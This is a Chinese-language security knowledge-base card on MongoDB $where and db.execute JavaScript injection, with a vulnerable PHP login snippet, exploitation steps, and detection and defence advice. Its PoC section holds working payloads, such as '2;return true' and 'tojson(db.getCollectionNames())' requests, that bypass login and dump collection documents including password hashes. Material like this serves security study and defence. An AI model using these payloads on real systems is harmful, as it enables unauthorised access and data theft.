---
id: web-generic-sqli-mongodb-where-javascript-injection
title: MongoDB $where JavaScript 注入：闭合拼接的 JS 片段绕过登录并用 tojson 导出集合与文档
type: scenario
domain: web
path: web/generic/sqli
technique: mongodb-where-javascript-injection
aliases:
- MongoDB $where 注入
- NoSQL JS 注入
- $where 登录绕过
- tojson 拖库
- db.getCollectionNames
- db.execute 注入
tags:
- mongodb
- nosql
- javascript
- where
- injection
- auth-bypass
- data-exfiltration
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V482
  verified_at: '2026-11-10T21:25:57+08:00'
  notes: 已对照原文与31张图核对：demo1 拼接 function q(){var username=...;var password=...; if(username=='weiyi'&&password=='123456')...} 与密码 2;return true 登录成功（图09-13）、demo2 secret_number 与 123; return true 绕过（图14-17）、demo3 XWAY 源码 $query="var data = db.notice.findOne({'id':'$id'}); return data;"+$db->execute 与 id=1'});return ({title:tojson(db.getCollectionNames()),1:'1 枚举集合（图18-20），再 tojson(db.Authority_confidential.find()[0]/[1]) 读出 name/password 哈希/status（图21-22）均与卡内一致；mapReduce 拼接注入段与原文一致。与 Strapi 操作符注入、Java JSON 拼接卡为不同执行层，dedup top候选 related/new，非重复。原文未标版本，affected_versions 留空正确。未验证点：未在本机 Mongo 复跑 $where/db.execute 注入；MongoDB 各版本 javascriptEnabled 默认值未逐版本核实（卡内已写旧版本默认开启）。frontmatter 无 sources/source_url。
---

## 一句话结论

当应用把用户输入拼进 MongoDB 的 `$where` JavaScript 函数/字符串并交给 `find`/`execute` 执行时，攻击者可以用 `;return true`、`'});` 等 payload 闭合原有 JS 片段，注入任意服务端 JavaScript：既能无条件通过登录判断，也能用 `tojson(db.getCollectionNames())`、`db.<集合>.find()[n]` 把集合名和文档内容回显到页面，形成完整的数据导出。

## 原理

- **`$where` 的服务端 JS 执行**：MongoDB 支持在查询中通过 `$where` 执行 JavaScript（函数或字符串），用于复杂条件；代码在 mongod 进程内执行，拥有当前数据库连接的全部权限。旧版本默认开启，很多部署也未关闭。
- **字符串拼接型登录校验**：示例代码把 username/password 直接拼进 JS 函数：

  ```php
  $query_body = "function q() {
      var username = ".$_REQUEST["username"].";
      var password = ".$_REQUEST["password"].";
      if(username == 'weiyi' && password == '123456') return true;
      else { return false; }
  }";
  $collection->find(array('$where' => $query_body));
  ```

  密码传 `2;return true` 后变成 `var password = 2;return true;if(username == ...)`，函数在到达 if 之前就返回 true，登录被绕过（页面回显 `login succeed`）。
- **数字比较型**：`var user_try = $tem; if (secret_number != user_try) return false; return true;`；传 `123; return true` 直接返回 true；也可以不注入 return，而是把 `$tem` 当成布尔 oracle 逐值试探 secret_number。
- **db.execute 注入与拖库**：示例 `$query="var data = db.notice.findOne({'id':'$id'}); return data;"` 后用 `$db->execute($query)`；id 传 `1'});return ({title:tojson(db.getCollectionNames()),1:'1` 时，闭合 `findOne` 并以 `title` 字段返回集合名列表，页面渲染出 `["Authority_confidential","notice","system.indexes"]`；再把 `tojson(db.Authority_confidential.find()[0])`/`[1]` 放进同一位置，即可逐条读出文档（示例读出 name/password 哈希/status）。
- **为什么成立**：注入发生在 JS 语法层，不经过任何查询参数绑定；服务端执行结果又被业务页面回显，形成“执行 + 回显”闭环。
- **mapReduce 同类**：把用户输入拼进 `map`/`reduce`/`opt` 的 JS 也可用同样方式闭合注入，示例通过拼接 `$param` 注入 `db.injection.insert(...)` 等语句。

## 触发条件

- 后端使用 MongoDB 的 `$where`、`db.execute`、`mapReduce` 等 JS 执行能力，且把用户输入拼进 JS 代码（未参数化、未转义）。
- mongod 允许服务端 JavaScript（`security.javascriptEnabled` 未关闭 / 未使用 `--noscripting`）。
- 接口把查询结果或执行结果回显到响应（登录成功页、列表页、错误信息）。
- 攻击者可访问该接口（登录/查询/详情页均可）。

## 利用步骤

1. 判断是否存在 JS 拼接：登录/查询页回显查询语句、错误信息含 JS 片段，或输入单引号/分号导致语法错误。
2. 登录绕过：在密码或用户名字段提交 `2;return true`（或 `1;return true`），观察是否直接登录成功。
3. 若为数字比较逻辑，提交 `<guess>; return true` 验证注入；或把输入当 oracle 逐值试探 secret。
4. `db.execute` 类接口：用 `1'});return ({title:tojson(db.getCollectionNames()),1:'1` 枚举集合；再把 `db.<集合>.find()[n]` 替换进 `tojson(...)` 逐条导出文档。
5. 对 mapReduce 拼接点，闭合 map/reduce/opt 的 JS 后插入任意语句（如写集合、读数据）。

## PoC

登录绕过（`$where` 拼接）：

```http
POST /nosql/login/login_1.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=weiyi&password=2;return true&login-submit=login
```

页面执行的实际 JS：

```javascript
function q() { var username = 'weiyi'; var password = 2;return true;if(username == 'weiyi'&&password == '123456') return true; else{ return false;} }
```

集合枚举：

```http
GET /new_list.php?id=1'});return ({title:tojson(db.getCollectionNames()),1:'1 HTTP/1.1
```

文档导出：

```http
GET /new_list.php?id=1'});return ({title:tojson(db.Authority_confidential.find()[0]),1:'1 HTTP/1.1
GET /new_list.php?id=1'});return ({title:tojson(db.Authority_confidential.find()[1]),1:'1 HTTP/1.1
```

## 变体与关联

- **变体**：`mapReduce` 的 map/reduce/opt 拼接注入；`$where` 函数体拼接与字符串拼接；`db.eval`（旧版本）；CouchDB 等支持 JS 视图的 NoSQL。
- **变体**：不注入 `return true`，而是用 JS 比较结果作为布尔 oracle 枚举字段值（如 secret_number）。
- 关联：[[web-generic-sqli-php-array-parameter-mongodb-operator-injection]]（操作符注入）、[[web-generic-sqli-mongodb-java-json-concat-regex-blind]]（JSON 拼接 + $regex 盲注）、[[web-nodejs-mongodb-json-operator-injection-prefix-oracle]]（嵌套对象注入）。
- 边界：mongod 关闭服务端 JS、应用改用查询构造器/参数绑定、结果不回显时，该链不成立。

## 检测与防御

- **代码层**：禁止把用户输入拼进 `$where`/`db.execute`/`mapReduce` 的 JS；必须使用时改成参数化查询或预定义函数 + 操作符。
- **数据库层**：关闭服务端 JavaScript（`security.javascriptEnabled=false` 或 `--noscripting`）；数据库账号最小权限，只授予必要集合的读写；禁用 `db.eval`。
- **检测信号**：查询中出现 `$where`、`db.execute`、`mapReduce`；请求参数含 `;return true`、`'});`、`tojson(`、`getCollectionNames`、`db.` 等片段；页面/响应出现集合名或文档 JSON。
- **兜底**：统一错误消息，避免回显 JS 与查询结构；对返回字段做白名单，防止查询结果直接渲染。
